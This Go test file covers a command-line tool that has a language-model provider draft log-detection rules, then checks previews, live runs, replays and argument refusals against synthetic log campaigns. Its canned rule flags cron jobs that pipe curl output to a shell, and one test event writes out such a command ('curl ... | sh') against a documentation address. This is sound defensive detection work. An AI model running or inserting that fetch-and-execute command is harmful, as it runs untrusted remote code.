package main

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/kenzietann/omamori/internal/outbound"
	"github.com/kenzietann/omamori/internal/scenario"
)

const cronRuleAnswer = `logsource:
  product: linux
  service: cron
detection:
  download:
    action: cron_run
    command|contains|all:
      - curl
      - '| sh'
  condition: download
tests:
  - name: pipe to shell
    events:
      - {product: linux, service: cron, action: cron_run, command: "curl -s http://198.51.100.7/a | sh"}
    expect: {alerts: 1}
  - name: plain curl
    events:
      - {product: linux, service: cron, action: cron_run, command: "curl -fsS https://hc.example.test/ping"}
    expect: {alerts: 0}
`

func campaignFolder(t *testing.T) string {
	t.Helper()
	folder := filepath.Join(t.TempDir(), "logs")
	day := time.Date(2026, 11, 11, 0, 0, 0, 0, time.UTC)
	for name, file := range scenario.GenerateCampaign(1, day, true).Files {
		path := filepath.Join(folder, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(file.Text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return folder
}

func ruleArgs(output, logs string, extra ...string) []string {
	args := []string{"rule", "draft", "--goal", "cron jobs that download a script and pipe it to a shell", "--title", "Cron download piped to a shell",
		"--level", "high", "--example", "web01/auth.log:68", "--year", "2026", "--timezone", "UTC", "--output", output}
	return append(append(args, extra...), logs)
}

func TestRuleDraftThroughTheCLI(t *testing.T) {
	logs := campaignFolder(t)
	before := snapshotFiles(t, logs)
	provider := &analystProvider{answer: cronRuleAnswer}
	factory := func(_, _, _, _ string) (outbound.Provider, error) { return provider, nil }

	for _, extra := range [][]string{{"--provider", "openai", "--model", "test"}, {"--provider", "openai", "--model", "test", "--dry-run"}} {
		output := filepath.Join(t.TempDir(), "preview")
		got := analyzeCommand(t, factory, ruleArgs(output, logs, extra...)...)
		if got.code != exitOK || !strings.Contains(got.stdout, "Nothing was sent") || !strings.Contains(got.stdout, "examples_that_must_match") || len(provider.sent) != 0 {
			t.Fatalf("preview: %d %s %s, sent %d", got.code, got.stdout, got.stderr, len(provider.sent))
		}
		if _, err := os.Stat(output); !os.IsNotExist(err) {
			t.Fatal("the preview created an output folder")
		}
	}

	liveOutput := filepath.Join(t.TempDir(), "live")
	got := analyzeCommand(t, factory, ruleArgs(liveOutput, logs, "--yes", "--provider", "openai", "--model", "test")...)
	if got.code != exitOK || len(provider.sent) != 1 || !strings.Contains(got.stdout, "Rule: ") {
		t.Fatalf("live: %d %s %s, calls %d", got.code, got.stdout, got.stderr, len(provider.sent))
	}
	files := analysisFiles(t, liveOutput)
	for _, name := range []string{"report.md", "report.html", "draft.json", "recording.json", "rule.yml"} {
		if files[name] == "" {
			t.Fatalf("missing %s", name)
		}
	}

	rulesFolder := filepath.Join(t.TempDir(), "my-rules")
	if err := os.Mkdir(rulesFolder, 0o700); err != nil {
		t.Fatal(err)
	}
	saved, err := os.ReadFile(files["rule.yml"])
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(rulesFolder, "rule.yml"), saved, 0o600); err != nil {
		t.Fatal(err)
	}
	detectOutput := filepath.Join(t.TempDir(), "detect")
	detected := runAt(t, detectNow, "detect", "--rules", rulesFolder, "--year", "2026", "--timezone", "UTC", "--output", detectOutput, logs)
	alerts, err := os.ReadFile(analysisFiles(t, detectOutput)["alerts.json"])
	if detected.code != exitOK || err != nil || !strings.Contains(string(alerts), "Cron download piped to a shell") || !strings.Contains(string(alerts), "web01/auth.log:68") {
		t.Fatalf("detect with the saved rule: %d %s %s %v", detected.code, detected.stdout, detected.stderr, err)
	}

	noProvider := func(_, _, _, _ string) (outbound.Provider, error) {
		t.Fatal("a replay asked for a provider")
		return nil, nil
	}
	replayOutput := filepath.Join(t.TempDir(), "replay")
	got = analyzeCommand(t, noProvider, ruleArgs(replayOutput, logs, "--replay", files["recording.json"])...)
	if got.code != exitOK || !strings.Contains(got.stdout, "REPLAY") {
		t.Fatalf("replay: %d %s %s", got.code, got.stdout, got.stderr)
	}
	replayed, err := os.ReadFile(analysisFiles(t, replayOutput)["rule.yml"])
	if err != nil || string(replayed) != string(saved) {
		t.Fatalf("the replay saved another rule: %v", err)
	}

	otherGoal := filepath.Join(t.TempDir(), "other")
	args := ruleArgs(otherGoal, logs, "--replay", files["recording.json"])
	args[3] = "another goal"
	got = analyzeCommand(t, noProvider, args...)
	if got.code != exitFailed || !strings.Contains(got.stderr, "no rule was accepted") {
		t.Fatalf("a replay with another goal: %d %s %s", got.code, got.stdout, got.stderr)
	}
	if _, err := os.Stat(analysisFiles(t, otherGoal)["rule.yml"]); err == nil {
		t.Fatal("a replay that did not fit wrote a rule")
	}

	if after := snapshotFiles(t, logs); !reflect.DeepEqual(before, after) {
		t.Fatal("the logs were changed")
	}
}

func TestRuleDraftRefusesBadUse(t *testing.T) {
	logs := campaignFolder(t)
	factory := func(_, _, _, _ string) (outbound.Provider, error) {
		return &analystProvider{answer: cronRuleAnswer}, nil
	}
	output := filepath.Join(t.TempDir(), "out")
	testCases := []struct {
		name string
		args []string
		code int
	}{
		{"no subcommand", []string{"rule"}, exitUsage},
		{"another subcommand", []string{"rule", "write", logs}, exitUsage},
		{"no goal", []string{"rule", "draft", "--example", "web01/auth.log:68", "--output", output, logs}, exitUsage},
		{"no example", []string{"rule", "draft", "--goal", "x", "--output", output, logs}, exitUsage},
		{"no logs", []string{"rule", "draft", "--goal", "x", "--example", "web01/auth.log:68", "--output", output}, exitUsage},
		{"yes and dry run", append(ruleArgs(output, logs), "--yes", "--dry-run"), exitUsage},
		{"an unknown provider", ruleArgs(output, logs, "--provider", "nobody", "--yes"), exitUsage},
		{"an example that is not there", append(ruleArgs(output, logs, "--provider", "openai", "--model", "test"), "--example", "web01/auth.log:999999"), exitFailed},
		{"an unknown level", ruleArgs(output, logs, "--provider", "openai", "--model", "test", "--level", "urgent"), exitFailed},
		{"too many attempts", ruleArgs(output, logs, "--provider", "openai", "--model", "test", "--attempts", "9"), exitFailed},
		{"output inside the logs", ruleArgs(filepath.Join(logs, "out"), logs, "--provider", "openai", "--model", "test"), exitFailed},
		{"clean logs inside the logs", ruleArgs(output, logs, "--provider", "openai", "--model", "test", "--benign", filepath.Join(logs, "web01")), exitFailed},
		{"clean logs with no event", ruleArgs(output, logs, "--provider", "openai", "--model", "test", "--benign", t.TempDir()), exitFailed},
	}
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			got := analyzeCommand(t, factory, testCase.args...)
			if got.code != testCase.code {
				t.Fatalf("code %d, want %d: %s %s", got.code, testCase.code, got.stdout, got.stderr)
			}
		})
	}
	if _, err := os.Stat(output); !os.IsNotExist(err) {
		t.Fatal("a refused command wrote something")
	}
}

func TestRuleDraftCleanLogsRefuseARuleThatMatchesThem(t *testing.T) {
	logs := campaignFolder(t)
	clean := cleanFolder(t, "auth.log", lineOf(t, filepath.Join(logs, "web01", "auth.log"), 68))
	provider := &analystProvider{answer: cronRuleAnswer}
	factory := func(_, _, _, _ string) (outbound.Provider, error) { return provider, nil }
	output := filepath.Join(t.TempDir(), "out")
	got := analyzeCommand(t, factory, ruleArgs(output, logs, "--yes", "--provider", "openai", "--model", "test", "--attempts", "1", "--benign", clean)...)
	if got.code != exitFailed || !strings.Contains(got.stderr, "no rule was accepted") || len(provider.sent) != 1 {
		t.Fatalf("%d %s %s, sent %d", got.code, got.stdout, got.stderr, len(provider.sent))
	}
	report, err := os.ReadFile(analysisFiles(t, output)["report.md"])
	if err != nil || !strings.Contains(string(report), "logs that the user gave as clean") {
		t.Fatalf("report %v:\n%s", err, report)
	}
}
